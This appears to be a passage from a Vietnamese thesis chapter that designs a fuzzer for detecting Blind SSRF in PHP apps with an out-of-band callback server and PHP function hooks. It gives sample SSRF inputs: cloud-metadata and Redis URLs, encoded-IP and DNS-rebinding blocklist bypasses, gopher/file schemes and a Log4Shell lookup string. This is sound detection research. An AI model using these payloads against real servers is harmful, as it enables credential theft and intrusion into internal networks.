\chapter{Thiết kế và Cài đặt Hệ thống}

Để phát hiện Blind SSRF, hệ thống cần giải quyết ba bài toán kỹ thuật độc
lập nhưng liên kết chặt: biết \emph{ứng dụng đã gọi hàm mạng nào và với
đối số gì} (tín hiệu in-band từ hook PHP), biết \emph{request đó có thực
sự kết nối tới OOB server không} (tín hiệu ngoại tuyến từ server lắng
nghe), và biết \emph{payload nào vượt qua được bộ lọc đầu vào của ứng
dụng} (bộ đột biến đa biến thể). Ba bài toán này quy định trực tiếp toàn
bộ kiến trúc được trình bày trong chương này.

Chương mở đầu bằng nền tảng lý thuyết: Phần~\ref{sec:ssrf} phân tích lỗ
hổng SSRF và lý do dạng Blind SSRF vô hình với mọi kênh tín hiệu truyền
thống; Phần~\ref{sec:oob} giải thích kỹ thuật Out-of-Band và cơ chế tương
quan token cho phép liên kết OOB callback về request gốc. Từ nền tảng đó,
Phần~\ref{sec:arch} mô tả kiến trúc bốn container và cơ sở hạ tầng chia
sẻ dữ liệu qua tmpfs. Các phần tiếp theo đi vào từng thành phần cài đặt:
hook hàm PHP và stream wrapper (Phần~\ref{sec:hook-impl}), OOB server
(Phần~\ref{sec:oob-impl}), bộ đột biến SSRF (Phần~\ref{sec:mutator-impl}),
cơ chế phát hiện hai tầng (Phần~\ref{sec:feedback-impl}), và điểm tích
hợp vào vòng lặp fuzz chính (Phần~\ref{sec:integration}).

% ============================================================
\section{Lỗ hổng Server-Side Request Forgery (SSRF)}
\label{sec:ssrf}
% ============================================================

\subsection{Định nghĩa và Nguyên lý Hoạt động}

Server-Side Request Forgery (SSRF) là lớp lỗ hổng bảo mật trong đó kẻ tấn
công khiến máy chủ ứng dụng thực hiện các yêu cầu mạng tùy ý tới địa chỉ
do attacker kiểm soát~\cite{owasp2021top10, owasp2023ssrf}. Lỗ hổng phát
sinh khi ứng dụng nhận URL hoặc địa chỉ IP từ input người dùng và dùng trực
tiếp nó để thực hiện network request phía server --- thường để fetch tài
nguyên, gọi webhook, hay tích hợp dịch vụ bên ngoài.

Trong PHP, SSRF thường xuất hiện khi input không được kiểm tra được truyền
vào các hàm như \texttt{file\_get\_contents()}, \texttt{curl\_exec()},
\texttt{wp\_remote\_get()}, \texttt{fsockopen()}, hay
\texttt{stream\_socket\_client()}. Đoạn code điển hình:

\begin{verbatim}
// /fetch.php?url=<user_input>
$url  = $_GET['url'];
$data = file_get_contents($url);  // SSRF sink
echo $data;
\end{verbatim}

Attacker có thể truyền \texttt{url=http://169.254.169.254/latest/meta-data/}
để đọc AWS instance metadata, hoặc \texttt{url=http://redis:6379} để tương
tác với Redis nội bộ vốn không được bảo vệ bởi tường lửa. Đây là ví dụ
minh họa của cả hai hướng tấn công chính: leo thang privilege qua cloud
metadata và di chuyển ngang (lateral movement) trong mạng nội bộ.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sơ đồ nguyên lý SSRF — hai lớp mạng.
    % Lớp ngoài (Internet): Attacker gửi HTTP GET /fetch.php?url=http://169.254.169.254/...
    %   đến Web Server. Tường lửa ở giữa chặn truy cập trực tiếp từ Internet vào Internal Network.
    % Lớp trong (Internal Network): Web Server (đã vào được bên trong) gọi
    %   file_get_contents($url) → HTTP request → Cloud Metadata Service (169.254.169.254),
    %   hoặc → Redis (:6379), hoặc → Admin Panel (/admin).
    % Kết quả: Response nội bộ về Web Server → Web Server phản ánh về Attacker (Regular SSRF)
    %   hoặc chỉ xử lý nội bộ (Blind SSRF).
    % Điểm nhấn màu đỏ: tường lửa có lỗ hổng — chặn Internet→Internal nhưng không chặn
    %   Web Server→Internal vì Web Server được coi là nội bộ.
    \includegraphics[width=0.85\textwidth]{figures/fig-ssrf-principle}
    \caption{Nguyên lý tấn công SSRF.}
    \label{fig:ssrf-principle}
\end{figure}

\subsection{Phân loại SSRF}

\textbf{Regular SSRF (In-band SSRF).} Response của network request phía server
được phản ánh một phần hoặc toàn bộ trong HTTP response trả về cho attacker.
Attacker có thể đọc trực tiếp nội dung tài nguyên nội bộ, khiến đây là dạng
SSRF dễ phát hiện nhất do có tín hiệu rõ ràng trong response.

\textbf{Blind SSRF (Out-of-band SSRF).} Máy chủ thực hiện network request
nhưng response \emph{không được} phản ánh trong HTTP response trả về --- ứng
dụng xử lý kết quả nội bộ, loại bỏ, hoặc chỉ ghi log. Từ góc độ bên ngoài,
HTTP response trông hoàn toàn bình thường. Blind SSRF đặc biệt phổ biến trong
các tình huống:
\begin{itemize}
    \item \textbf{Webhook validation}: Ứng dụng gọi URL để kiểm tra tính
    hợp lệ nhưng không trả về nội dung. Ví dụ: nhiều plugin WordPress xác
    nhận URL webhook bằng cách gửi request thử và kiểm tra status code.
    \item \textbf{Background processing}: Request được đẩy vào hàng đợi
    (queue) và xử lý bất đồng bộ bởi worker riêng, không liên quan đến HTTP
    response của request gốc.
    \item \textbf{License/telemetry checks}: Nhiều plugin thương mại gọi
    server nhà sản xuất trong background để kiểm tra license hoặc gửi thống
    kê ẩn danh, không hiển thị kết quả.
\end{itemize}

\textbf{Semi-blind SSRF.} Một số tài liệu phân loại thêm dạng trung gian:
ứng dụng không phản ánh nội dung response nhưng có sự khác biệt quan sát
được trong HTTP response (ví dụ: thời gian phản hồi khác nhau, status code
khác nhau). Dạng này có thể phát hiện bằng kỹ thuật timing oracle nhưng khó
tự động hóa do phụ thuộc vào nhiễu mạng.

\subsection{Tác động và Mức độ Nghiêm trọng}

SSRF được đưa vào OWASP Top 10:2021 tại vị trí A10:2021 --- Server-Side
Request Forgery như một mục riêng biệt~\cite{owasp2021top10} --- đây là lần
đầu tiên trong lịch sử OWASP Top 10 lỗ hổng này được ghi nhận, phản ánh
tần suất và mức độ ảnh hưởng ngày càng tăng trong kiến trúc microservice và
cloud. Tác động của SSRF bao gồm:

\begin{itemize}
    \item \textbf{Truy cập tài nguyên nội bộ}: Tiếp cận các dịch vụ như cơ
    sở dữ liệu, Redis, Elasticsearch vốn không được tiếp xúc với Internet,
    vượt qua chính sách tường lửa nhờ dùng máy chủ ứng dụng làm proxy.
    \item \textbf{Đánh cắp credentials cloud}: Trong môi trường AWS, Azure,
    GCP, attacker có thể lấy IAM credentials từ instance metadata service
    (\texttt{169.254.169.254}), dẫn tới chiếm quyền toàn bộ cloud account.
    Đây chính là vectơ tấn công được dùng trong sự cố Capital One 2019 gây
    lộ lọt dữ liệu của 100 triệu khách hàng~\cite{owasp2021top10}.
    \item \textbf{Port scanning mạng nội bộ}: Máy chủ bị lợi dụng để quét
    và xác định các dịch vụ đang chạy trong mạng nội bộ, phục vụ cho các
    bước tấn công tiếp theo.
    \item \textbf{Leo thang lên RCE qua Gopher}: Kết hợp Gopher protocol với
    Redis RESP injection, attacker gửi lệnh Redis tùy ý và khai thác cấu hình
    Redis không có xác thực để ghi file tùy ý lên hệ thống, từ đó leo thang
    thành Remote Code Execution.
    \item \textbf{Đọc file cục bộ}: Khi ứng dụng dùng \texttt{file://} scheme,
    SSRF có thể đọc file nhạy cảm như \texttt{/etc/passwd},
    \texttt{/etc/shadow} hay mã nguồn ứng dụng.
\end{itemize}

\subsection{Phân tích Kỹ thuật Bypass Phổ biến}
\label{subsec:ssrf-bypass}

Nhiều ứng dụng cố gắng ngăn chặn SSRF bằng blocklist, từ chối các IP nội
bộ như \texttt{127.0.0.1}, \texttt{10.0.0.0/8}, \texttt{192.168.0.0/16}.
Tuy nhiên, blocklist thường không đầy đủ và có thể vượt qua bằng nhiều
kỹ thuật~\cite{owasp2023ssrf}:

\textbf{Biểu diễn IP thay thế.} Nhiều bộ phân tích URL chấp nhận các dạng
biểu diễn địa chỉ IP khác nhau mà blocklist dựa trên chuỗi không bắt kịp:
\begin{itemize}
    \item Hex: \texttt{0x7f000001} = 127.0.0.1
    \item Decimal: \texttt{2130706433} = 127.0.0.1
    \item Octal: \texttt{0177.0.0.1} = 127.0.0.1
    \item IPv6 mapped: \texttt{::ffff:127.0.0.1} hay \texttt{::ffff:7f00:1}
    \item URL-encoded dot: \texttt{127.0.0\%2e1} hay \texttt{127.0.0\%252e1}
    (double encoding)
\end{itemize}

\textbf{DNS rebinding.} Đây là kỹ thuật bypass tinh vi nhất, lợi dụng
khoảng thời gian giữa hai lần DNS lookup:
\begin{enumerate}
    \item Attacker kiểm soát DNS server cho domain \texttt{evil.attacker.com}.
    \item Lần DNS lookup đầu tiên (khi ứng dụng validate URL): DNS server trả
    về địa chỉ IP public hợp lệ, vượt qua kiểm tra blocklist.
    \item Attacker cấu hình DNS với TTL rất ngắn (1 giây).
    \item Sau khi TTL hết hạn, lần DNS lookup thứ hai (khi ứng dụng thực sự
    kết nối): DNS server trả về địa chỉ IP nội bộ như \texttt{192.168.1.1}.
    \item Ứng dụng kết nối tới địa chỉ nội bộ mà không kiểm tra lại.
\end{enumerate}
Kỹ thuật này đặc biệt nguy hiểm vì nó qua được cả các cơ chế bảo vệ
``check-then-use'' được thiết kế cẩn thận.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Timeline DNS Rebinding Attack (trục thời gian nằm ngang).
    % T=0 (Lần DNS lookup 1 — Validation):
    %   App kiểm tra: attacker.com → DNS Server của Attacker → 1.2.3.4 (public IP).
    %   Kết quả: IP 1.2.3.4 không nằm trong blocklist → PASS.
    %   DNS TTL = 1 giây.
    % T=1s (TTL hết hạn): cache DNS bị xóa.
    % T=2 (Lần DNS lookup 2 — Connection):
    %   App kết nối: attacker.com → DNS Server của Attacker → 192.168.1.1 (internal IP).
    %   Kết quả: App kết nối thực sự tới 192.168.1.1 trong mạng nội bộ.
    % Phần dưới: so sánh hai dòng — "Validation" vs "Connection" — để thấy IP thay đổi.
    \includegraphics[width=0.80\textwidth]{figures/fig-dns-rebinding}
    \caption{Kỹ thuật DNS Rebinding.}
    \label{fig:dns-rebinding}
\end{figure}

\textbf{Redirect qua domain tin cậy.} Nếu ứng dụng có open redirect trên
một domain được whitelist, attacker có thể dùng redirect đó để chuyển hướng
request tới địa chỉ nội bộ. Ví dụ: \texttt{http://trusted.com/redirect?url=
http://192.168.1.1}.

\textbf{URL parsing inconsistency.} Userinfo trong URL (\texttt{http://
user@host:port/path}) có thể gây nhầm lẫn giữa các parser khác nhau:
\texttt{http://trusted.com@192.168.1.1/} --- một số parser coi
\texttt{trusted.com} là hostname, parser khác coi đây là userinfo và
\texttt{192.168.1.1} mới là hostname thực sự.

\textbf{Scheme thay thế.} Ngoài \texttt{http://} và \texttt{https://}, PHP
hỗ trợ nhiều URL scheme khác có thể khai thác SSRF:
\begin{itemize}
    \item \texttt{file://}: Đọc file cục bộ.
    \item \texttt{gopher://}: Gửi dữ liệu TCP tùy ý, dùng để tương tác với
    Redis, Memcached, SMTP.
    \item \texttt{dict://}: Truy vấn từ điển qua TCP, có thể dùng để port
    scan.
    \item \texttt{ftp://}: Kết nối FTP, có thể rò rỉ địa chỉ IP nội bộ.
\end{itemize}

\subsection{SSRF trong Hệ sinh thái PHP}
\label{subsec:ssrf-php}

PHP có những đặc điểm ngôn ngữ khiến SSRF đặc biệt phổ biến trong hệ sinh
thái này~\cite{phpgroup2023history}.

\textbf{Stream wrappers.} PHP triển khai một hệ thống \emph{stream wrapper}
cho phép nhiều giao thức khác nhau được truy cập qua cùng một API file I/O.
Khi \texttt{file\_get\_contents(\$url)} được gọi, PHP tự động chọn wrapper
phù hợp dựa trên scheme của URL: \texttt{http://} dùng HTTP wrapper,
\texttt{ftp://} dùng FTP wrapper, \texttt{file://} dùng file wrapper,
\texttt{php://} dùng built-in PHP stream. Điều này có nghĩa là mọi hàm I/O
của PHP --- không chỉ các hàm cURL chuyên dụng --- đều tiềm ẩn nguy cơ SSRF
khi nhận input không được kiểm tra.

\textbf{WordPress HTTP API.} WordPress cung cấp \texttt{wp\_remote\_get()},
\texttt{wp\_remote\_post()}, \texttt{wp\_remote\_request()} như một abstraction
layer trên cURL. Hàng nghìn plugin WordPress dùng các hàm này để tích hợp
dịch vụ bên ngoài; nếu tham số URL có thể bị kiểm soát bởi input người dùng
(dù gián tiếp), SSRF có thể xảy ra. Do nằm ở tầng framework cao, các hàm
này thường bị bỏ sót trong các công cụ SSRF analysis vốn chỉ hook tầng
cURL/PHP gốc.

\textbf{Non-obvious sinks.} Ngoài các hàm HTTP rõ ràng, nhiều hàm PHP ít được
chú ý cũng thực hiện network request ngầm khi nhận URL:
\texttt{getimagesize(\$url)}, \texttt{exif\_read\_data(\$url)},
\texttt{get\_headers(\$url)}, \texttt{SimpleXML::load(\$url)},
\texttt{DOMDocument::load(\$url)}, \texttt{SoapClient::\_\_construct()} (WSDL
endpoint). Ví dụ: nhiều ứng dụng cho phép người dùng nhập URL ảnh đại diện,
rồi gọi \texttt{getimagesize(\$url)} để kiểm tra kích thước ảnh trước khi
tải về --- đây là SSRF sink không hiển nhiên.

\subsection{Thách thức Phát hiện Blind SSRF trong Fuzzing Tự động}

Blind SSRF đặt ra thách thức cơ bản cho mọi công cụ fuzzing, bao gồm cả
greybox fuzzer như Phuzz:

\begin{enumerate}
    \item \textbf{HTTP response không có tín hiệu}: Response trả về bình
    thường --- không có exception, không có thay đổi status code, không có
    nội dung bất thường. Mọi VulnChecker dựa trên phân tích response đều
    không phát hiện được gì.
    \item \textbf{Coverage không phân biệt được}: Khi
    \texttt{file\_get\_contents(\$url)} được gọi với URL hợp lệ hay URL SSRF,
    code path thực thi là hoàn toàn như nhau --- fuzzer không có cơ sở từ
    độ phủ mã để nhận biết một network request bất thường đã xảy ra.
    \item \textbf{Hành vi bất đồng bộ}: Request SSRF có thể được đẩy vào
    background job (queue worker, cron job), tức kết quả không xuất hiện
    trong response của request gốc mà xảy ra sau đó nhiều giây hoặc nhiều
    phút.
    \item \textbf{Bằng chứng chỉ có ở kênh ngoài}: Dấu hiệu duy nhất của
    Blind SSRF là việc một máy chủ ngoài \emph{nhận được kết nối} từ máy
    chủ ứng dụng --- thông tin này không bao giờ nằm trong luồng HTTP thông
    thường giữa fuzzer và ứng dụng.
\end{enumerate}

Những hạn chế này dẫn đến kết luận: cần một kênh tín hiệu \emph{ngoài băng}
(out-of-band) độc lập để phát hiện Blind SSRF một cách đáng tin cậy.
Phần~\ref{sec:oob} trình bày kỹ thuật giải quyết vấn đề này.

% ============================================================
\section{Kỹ thuật Out-of-Band (OOB)}
\label{sec:oob}
% ============================================================

\subsection{Khái niệm và Bối cảnh}

Tương tác Out-of-Band (OOB) là kỹ thuật mà trong đó ứng dụng bị kiểm thử
được kích hoạt để \emph{chủ động liên lạc} tới một máy chủ lắng nghe
(\emph{OOB server} hay \emph{interaction server}) do kiểm thử viên kiểm soát,
qua một kênh mạng hoàn toàn độc lập với kênh HTTP chính đang kiểm thử. Thay
vì chờ ứng dụng trả về dấu hiệu lỗi, kỹ thuật OOB lắng nghe các kết nối
\emph{đến từ} ứng dụng mục tiêu.

Kỹ thuật này được sử dụng rộng rãi trong kiểm thử thủ công, điển hình là
Burp Suite Collaborator~\cite{portswigger2023burp}: một dịch vụ cloud cung
cấp các subdomain và địa chỉ IP dùng một lần để phát hiện blind interaction.
Burp Collaborator giải quyết ba lớp OOB: DNS (domain lookup), HTTP (HTTP
request), và SMTP (email). Khi payload gây ra bất kỳ tương tác nào với server
Collaborator, Burp Suite ghi nhận và báo cáo.

Trong lĩnh vực nghiên cứu bảo mật, kỹ thuật OOB đã được ứng dụng để phát
hiện nhiều lớp lỗ hổng ``blind'' khác nhau:
\begin{itemize}
    \item \textbf{Blind SSRF}: Phát hiện qua HTTP/DNS callback từ server.
    \item \textbf{Blind XXE}: Entity trong XML file trỏ về OOB server; khi
    XML parser resolve external entity, callback được ghi nhận.
    \item \textbf{Blind SQLi}: Một số database hỗ trợ DNS lookup trong query
    (MySQL \texttt{LOAD\_FILE}, MSSQL \texttt{xp\_dirtree}) để exfiltrate
    dữ liệu qua DNS.
    \item \textbf{Log4Shell (CVE-2021-44228)}: JNDI lookup \texttt{\$\{jndi:
    ldap://oob-server/\}} trong Java logging framework; OOB server nhận
    LDAP/DNS request xác nhận code path bị ảnh hưởng.
\end{itemize}

\subsection{Cơ chế Token-Based Correlation}
\label{subsec:oob-token}

Thách thức cốt lõi khi dùng OOB trong fuzzing tự động là \emph{tương quan
nhân quả} (causal correlation): khi OOB server nhận một kết nối, phải xác
định chính xác đó là callback từ request fuzz nào trong số hàng nghìn request
đang gửi song song. Cơ chế giải quyết là token-based correlation:

\begin{enumerate}
    \item Fuzzer sinh một \emph{token} ngẫu nhiên (chuỗi alphanumeric 8 ký
    tự) duy nhất cho mỗi lần đột biến, lưu vào bảng \texttt{token\_map}.
    \item Token được nhúng vào payload SSRF dưới dạng URL path hoặc subdomain:
    \texttt{http://<oob-server>/<token>} hoặc
    \texttt{http://<token>.<oob-domain>/}.
    \item Khi ứng dụng mục tiêu thực hiện HTTP/DNS request tới địa chỉ trên,
    OOB server ghi nhận callback cùng với token và thời gian.
    \item Fuzzer tra cứu \texttt{token\_map}: nếu tìm thấy log callback khớp
    token của ứng viên, ứng viên đó được xác nhận là SSRF.
\end{enumerate}

Cơ chế này đảm bảo \emph{zero false positive}: một ứng viên chỉ được báo cáo
là SSRF khi có bằng chứng mạng thực tế (kết nối vật lý đến OOB server),
không phụ thuộc vào heuristic hay pattern matching trên response.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sequence diagram cơ chế OOB token-based correlation (5 thực thể theo chiều dọc).
    % Các thực thể (cột từ trái qua phải):
    %   Fuzzer | phuzz-web (PHP) | phuzz-oob (OOB Server) | shared-tmpfs | SSRFVulnCheck
    % Luồng thông điệp (mũi tên ngang):
    %   1. Fuzzer → Fuzzer: sinh token "ab12cd34", lưu token_map[token]=timestamp.
    %   2. Fuzzer → phuzz-web: HTTP POST url="http://172.20.0.10:8000/ab12cd34"
    %                           [X-Fuzzer-Covid: req-001].
    %   3. phuzz-web → phuzz-web: PHP hook kích hoạt, ghi ssrf-hooks/req-001.json.
    %   4. phuzz-web → phuzz-oob: HTTP GET /ab12cd34 (PHP thực sự gọi file_get_contents).
    %   5. phuzz-oob → shared-tmpfs: ghi oob-logs/ab12cd34.json.
    %   6. phuzz-web → Fuzzer: HTTP 200 OK (response bình thường).
    %   7. Fuzzer → SSRFVulnCheck: check(candidate req-001).
    %   8. SSRFVulnCheck → shared-tmpfs: đọc ssrf-hooks/req-001.json → token="ab12cd34".
    %   9. SSRFVulnCheck → shared-tmpfs: đọc oob-logs/ab12cd34.json → tồn tại!
    %   10. SSRFVulnCheck → Fuzzer: return True (SSRF xác nhận).
    \includegraphics[width=0.92\textwidth]{figures/fig-oob-token-flow}
    \caption{Cơ chế tương quan token trong phát hiện Blind SSRF.}
    \label{fig:oob-token-flow}
\end{figure}

\subsection{So sánh Các Giao thức OOB}
\label{subsec:oob-protocols}

Có ba giao thức chính thường dùng cho OOB interaction, mỗi giao thức có
đặc điểm về triển khai, khả năng vượt egress filter, và phù hợp với loại
lỗ hổng khác nhau:

\begin{table}[h]
\centering
\caption{So sánh các giao thức OOB interaction}
\label{tab:oob-protocols}
\begin{tabular}{|l|p{3.2cm}|p{3.2cm}|p{3.2cm}|}
\hline
\textbf{Tiêu chí}
    & \textbf{DNS OOB}
    & \textbf{HTTP OOB}
    & \textbf{SMTP OOB} \\
\hline
Vượt egress filter
    & Tốt nhất (port 53 UDP thường mở)
    & Tốt (port 80/443)
    & Kém (port 25 thường bị chặn)  \\
\hline
Hạ tầng
    & Phức tạp (cần wildcard DNS authority)
    & Đơn giản (HTTP server + dnsmasq)
    & Phức tạp (SMTP server)  \\
\hline
Token trong payload
    & Subdomain: \texttt{<tok>.oob.}
    & URL path: \texttt{/<tok>}
    & Header/body  \\
\hline
Metadata ghi được
    & Ít (IP, timestamp)
    & Nhiều (IP, method, headers, path, body)
    & Vừa  \\
\hline
Phù hợp với
    & Mọi lớp lỗ hổng blind
    & SSRF, XXE, blind RCE
    & Phishing, account takeover  \\
\hline
Phù hợp tích hợp tự động
    & Trung bình
    & Tốt nhất
    & Kém  \\
\hline
\end{tabular}
\end{table}

Với bối cảnh tích hợp vào fuzzing tự động trong môi trường Docker, HTTP OOB
là lựa chọn phù hợp nhất: dễ triển khai, ghi log chi tiết, token nằm trong
URL path giúp tương quan dễ dàng, và các container giao tiếp nhau qua mạng
bridge mà không cần đi ra Internet. Hệ thống đề xuất trong khóa luận này bổ
sung thêm DNS OOB (qua dnsmasq wildcard) để tăng khả năng bypass egress
filter trong các môi trường chặt chẽ hơn.

\subsection{OOB như Kênh Phản hồi Bổ sung trong Fuzzing}

Trong kiến trúc fuzzing, kênh OOB đóng vai trò là \emph{kênh phản hồi thứ
ba}, song song và bổ sung cho hai kênh truyền thống:

\begin{itemize}
    \item \textbf{Kênh HTTP response}: Phân tích status code, headers, body
    để phát hiện lỗ hổng có dấu hiệu trong response (XSS, SQLi lỗi cú pháp,
    path traversal trả về nội dung file).
    \item \textbf{Kênh coverage}: Theo dõi code path được thực thi để điều
    hướng fuzzer khám phá code mới; không phân biệt được loại hành vi bên
    trong code path.
    \item \textbf{Kênh OOB}: Ghi nhận network callback từ ứng dụng, cho phép
    phát hiện các hành vi mạng mà hai kênh trên không thể quan sát.
\end{itemize}

Điểm mấu chốt là kênh OOB hoàn toàn \emph{độc lập} với ứng dụng mục tiêu
--- nó không yêu cầu thay đổi ứng dụng, không phụ thuộc vào error handling
của ứng dụng, và hoạt động ngay cả khi ứng dụng cố tình che giấu lỗi hoặc
xử lý request SSRF trong background.

\subsection{Xử lý Tính Bất đồng bộ}
\label{subsec:oob-async}

Một thách thức quan trọng trong tích hợp OOB vào fuzzing là tính bất đồng bộ
của callback: khi fuzzer nhận HTTP response từ ứng dụng, ứng dụng có thể đã
thực hiện OOB call đồng bộ trong request handler, hoặc đẩy call vào background
job và xử lý sau.

Để không bỏ sót trường hợp thứ hai, hệ thống trong khóa luận này áp dụng
chiến lược hai giai đoạn:
\begin{enumerate}
    \item \textbf{Kiểm tra tức thì}: Sau khi nhận HTTP response, tra cứu
    OOB log ngay lập tức để bắt các callback đồng bộ.
    \item \textbf{Token map với TTL}: Token không bị xóa ngay sau kiểm tra;
    chúng được giữ lại trong \texttt{token\_map} trong suốt phiên fuzz. OOB
    log có thể được quét lại theo định kỳ để bắt callback trễ từ background
    job.
\end{enumerate}

Chiến lược này đảm bảo cả Blind SSRF đồng bộ và bất đồng bộ đều được phát
hiện mà không đưa ra false positive.

% ============================================================
\section{Kiến trúc Tổng quan}
\label{sec:arch}
% ============================================================

\subsection{Môi trường Triển khai}

Toàn bộ hệ thống được đóng gói trong môi trường Docker~\cite{docker2023}
và khởi chạy bằng một file \texttt{docker-compose.ssrf.yml} duy nhất. Môi
trường gồm bốn container:

\begin{itemize}
    \item \textbf{phuzz-oob} --- Máy chủ OOB; chạy hai tiến trình song song
    qua \texttt{supervisord}: dnsmasq (phân giải DNS) và Flask HTTP listener.
    Container được gán địa chỉ IP tĩnh \texttt{172.20.0.10} trong mạng nội bộ.
    \item \textbf{phuzz-db} --- Cơ sở dữ liệu MySQL 8 dùng chung cho ứng dụng
    mục tiêu.
    \item \textbf{phuzz-web} --- Container PHP/Apache chứa ứng dụng mục tiêu
    được instrument; dùng \texttt{phuzz-oob} làm DNS server.
    \item \textbf{phuzz-fuzzer} --- Container fuzzer; chạy script
    \texttt{fuzzer.py} với \texttt{SSRFMutator} và \texttt{SSRFVulnCheck} được
    tích hợp.
\end{itemize}

\subsection{Mạng Docker}

Cả bốn container chia sẻ một Docker bridge network tên \texttt{phuzz-net}
với subnet cố định \texttt{172.20.0.0/24}. Việc cố định subnet là điều kiện
bắt buộc để hai cơ chế sau hoạt động:

\begin{enumerate}
    \item \textbf{IP tĩnh OOB server}: \texttt{phuzz-oob} phải có IP cố định
    \texttt{172.20.0.10} để các payload IP-based trong
    \texttt{SSRFMutator} luôn trỏ đúng địa chỉ, kể cả các biến thể
    mã hóa (decimal \texttt{2886795274}, hex \texttt{0xac14000a}, octal
    \texttt{0254.024.0.012}).
    \item \textbf{DNS *.oob}: \texttt{phuzz-web} được cấu hình
    \texttt{dns: [172.20.0.10]} để sử dụng \texttt{phuzz-oob} làm nameserver.
    dnsmasq trên \texttt{phuzz-oob} trả lời mọi truy vấn \texttt{*.oob} về
    \texttt{172.20.0.10}, cho phép payload dạng
    \texttt{http://<token>.oob:8000/} được phân giải đúng.
\end{enumerate}

\subsection{Shared Volume và Luồng Dữ liệu}

Hai Docker volume kiểu tmpfs làm kênh giao tiếp giữa các container:

\begin{itemize}
    \item \textbf{shared-tmpfs} (512 MB) được mount vào cả ba container
    \texttt{phuzz-oob}, \texttt{phuzz-web}, \texttt{phuzz-fuzzer}.
    Bảng~\ref{tab:tmpfs} liệt kê các thư mục con.
    \item \textbf{sync-tmpfs} (256 MB) dùng để đồng bộ tập ứng viên giữa
    nhiều instance fuzzer chạy song song.
\end{itemize}

\begin{table}[h]{Cấu trúc thư mục trên \texttt{shared-tmpfs}}
\label{tab:tmpfs}
\centering
\begin{tabular}{|l|l|l|}
\hline
\textbf{Thư mục} & \textbf{Người ghi} & \textbf{Người đọc} \\
\hline
\texttt{coverage-reports/}    & phuzz-web (PHP)      & phuzz-fuzzer \\
\texttt{ssrf-hooks/}          & phuzz-web (PHP hook) & phuzz-fuzzer \\
\texttt{oob-logs/}            & phuzz-oob (Flask)    & phuzz-fuzzer \\
\texttt{ssrf-error-reports/}  & phuzz-fuzzer         & phuzz-fuzzer \\
\hline
\end{tabular}
\end{table}

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sơ đồ kiến trúc 4-container Docker của hệ thống đề xuất.
    % Hình chữ nhật lớn bên ngoài: Docker network "phuzz-net" (172.20.0.0/24).
    % Bên trong: 4 container dạng hộp màu khác nhau:
    %   - phuzz-fuzzer (172.20.0.x): "Fuzzer (Python)" — SSRFMutator, SSRFVulnCheck,
    %     vòng lặp fuzz chính. Nối với phuzz-web qua HTTP.
    %   - phuzz-web (172.20.0.y): "Web Container (PHP 8.x + Apache)" — ứng dụng
    %     mục tiêu, 08_ssrf.php hook, PCOV/Xdebug coverage. Nối phuzz-db qua MySQL.
    %   - phuzz-oob (172.20.0.10): "OOB Server" — Flask HTTP:8000 + HTTPS:8443,
    %     dnsmasq (*.oob → 172.20.0.10). Viền màu đỏ/cam để nổi bật.
    %   - phuzz-db (172.20.0.z): "MySQL 8".
    % Kết nối:
    %   fuzzer ↔ web: HTTP request / X-Fuzzer-Covid header.
    %   web → oob: OOB callback (khi ứng dụng gọi file_get_contents(SSRF_URL)).
    %   web → db: SQL queries.
    % Hình trụ "shared-tmpfs (512 MB)" nối fuzzer ↔ web ↔ oob (3 container đọc/ghi).
    % Hình trụ "sync-tmpfs (256 MB)" nối các fuzzer instance song song.
    \includegraphics[width=0.90\textwidth]{figures/fig-system-arch}
    \caption{Kiến trúc tổng quan hệ thống đề xuất.}
    \label{fig:system-arch}
\end{figure}

\subsection{Thứ tự Khởi động}

\texttt{phuzz-oob} và \texttt{phuzz-db} khởi động trước; \texttt{phuzz-web}
chỉ được coi là \textit{healthy} khi file \texttt{/shared-tmpfs/web-paths.txt}
tồn tại (script \texttt{entrypoint.sh} chạy \texttt{find /var/www/html} và
ghi ra file này sau khi hoàn tất rsync ứng dụng). \texttt{phuzz-fuzzer} đợi
\texttt{phuzz-web} qua \texttt{condition: service\_healthy} trước khi bắt đầu
vòng lặp fuzz.

% ============================================================
\section{Hook Hàm PHP}
\label{sec:hook-impl}
% ============================================================

\subsection{Cơ chế Tải Hook}

Hook được đặt trong file \texttt{08\_ssrf.php} thuộc thư mục
\texttt{instrumentation/overrides.d/} và được load tự động qua cơ chế
\texttt{auto\_prepend\_file} của PHP. Nhờ đó, \texttt{08\_ssrf.php} được
thực thi trước bất kỳ code ứng dụng nào, đảm bảo hook luôn sẵn sàng từ
đầu mỗi request. Cơ chế \texttt{auto\_prepend\_file} này là thành phần
instrumentation sẵn có của Phuzz~\cite{neef2024phuzz} --- khóa luận chỉ
thêm file hook SSRF vào thư mục \texttt{overrides.d/} mà không cần sửa
đổi hạ tầng instrumentation gốc.

Hằng số \texttt{\_\_FUZZER\_\_COVID} (được inject bởi instrumentation
framework Phuzz từ header \texttt{X-Fuzzer-Covid}) được dùng làm tên file
log, đảm bảo mỗi hook log khớp chính xác với request mà fuzzer đã gửi.

\subsection{Nhận diện OOB Payload}

Hàm \texttt{\_\_fuzzer\_\_ssrf\_is\_oob()} kiểm tra xem đối số truyền vào
một hàm mạng có chứa định danh OOB hay không. Hàm này được thiết kế để bao
phủ toàn bộ 21 biến thể payload của \texttt{SSRFMutator} (xem
Phần~\ref{sec:mutator-impl}):

\begin{verbatim}
function __fuzzer__ssrf_is_oob(string $value): bool {
    static $needles = null;
    if ($needles === null) {
        $needles = [
            '172.20.0.10',   // plain IP (và trailing-dot, userinfo, fragment)
            '2886795274',    // decimal IP
            '0xac14000a',    // hex IP
            '0254.024.0.012',// octal IP
            '::ffff:ac14',   // IPv6 mapped hex
            '.oob:',         // DNS *.oob (http://<token>.oob:8000)
            '.oob/',         // DNS *.oob (path)
            '.nip.io',       // nip.io bypass
            '.sslip.io',     // sslip.io bypass
            'oob.phuzz',     // hostname bypass (extra_hosts)
        ];
    }
    $lower = strtolower($value);
    foreach ($needles as $needle) {
        if (strpos($lower, $needle) !== false) {
            return true;
        }
    }
    return false;
}
\end{verbatim}

Việc dùng \texttt{strpos} với \texttt{strtolower} đảm bảo cả biến thể
\texttt{HTTP://} (mixed-case scheme, variant 10) cũng được nhận diện chính
xác.

\subsection{Ghi Log SSRF Hook}

Khi \texttt{\_\_fuzzer\_\_ssrf\_is\_oob()} trả về \texttt{true}, hàm
\texttt{\_\_fuzzer\_\_ssrf\_log()} ghi một JSON entry vào thư mục
